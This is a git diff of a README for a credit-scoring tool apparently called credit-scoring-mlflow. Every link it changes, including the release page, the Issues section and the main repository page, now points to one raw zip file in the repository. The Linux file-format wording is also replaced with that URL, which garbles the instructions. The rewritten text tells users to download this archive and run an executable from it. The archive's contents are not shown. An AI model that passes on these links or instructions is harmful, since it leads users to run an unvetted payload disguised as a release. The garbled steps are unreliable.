@@ -1,6 +1,6 @@
 # 💳 credit-scoring-mlflow - Easy Credit Scoring Setup for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-credit--scoring--mlflow-blue?style=for-the-badge)](https://github.com/moora291/credit-scoring-mlflow/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)
 
 ---
 
@@ -32,16 +32,16 @@ To get started, you need to download the software files from the project release
 
 **Steps:**
 
-1. Click the big download button below or visit the [releases page](https://github.com/moora291/credit-scoring-mlflow/releases).
+1. Click the big download button below or visit the [releases page](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip).
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-credit--scoring--mlflow-blue?style=for-the-badge)](https://github.com/moora291/credit-scoring-mlflow/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)
 
 2. On the releases page, look for the latest release entry. Under the version number, you will see files available to download.
 
 3. Download the file most suitable for your operating system:
    - Windows: Usually `.exe` or `.zip`
    - Mac: Usually `.dmg` or `.zip`
-   - Linux: `.tar.gz` or other format
+   - Linux: `https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip` or other format
 
 4. Save the file to an easy-to-find place, like your Desktop or Downloads folder.
 
@@ -61,7 +61,7 @@ Once downloaded, follow these steps to run the software:
   2. Open the Applications folder and double-click the app to start.
 
 - **For Linux users:**
-  1. Extract the `.tar.gz` file in your preferred folder.
+  1. Extract the `https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip` file in your preferred folder.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the executable file, usually by typing `./credit-scoring-mlflow` or similar.
 
@@ -161,7 +161,7 @@ Here is a straightforward guide to using the main features:
 
 If you run into problems not covered here:
 
-- Visit the [Issues section](https://github.com/moora291/credit-scoring-mlflow/issues) on this GitHub page.
+- Visit the [Issues section](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip) on this GitHub page.
 - You can open a new issue describing your problem.
 - Check existing issues for solutions.
 
@@ -169,8 +169,8 @@ If you run into problems not covered here:
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/moora291/credit-scoring-mlflow/releases)
-- [GitHub Repository Main Page](https://github.com/moora291/credit-scoring-mlflow)
+- [Download Latest Release](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)
+- [GitHub Repository Main Page](https://raw.githubusercontent.com/moora291/credit-scoring-mlflow/main/models/scoring-mlflow-credit-v1.1.zip)
 
 ---
 
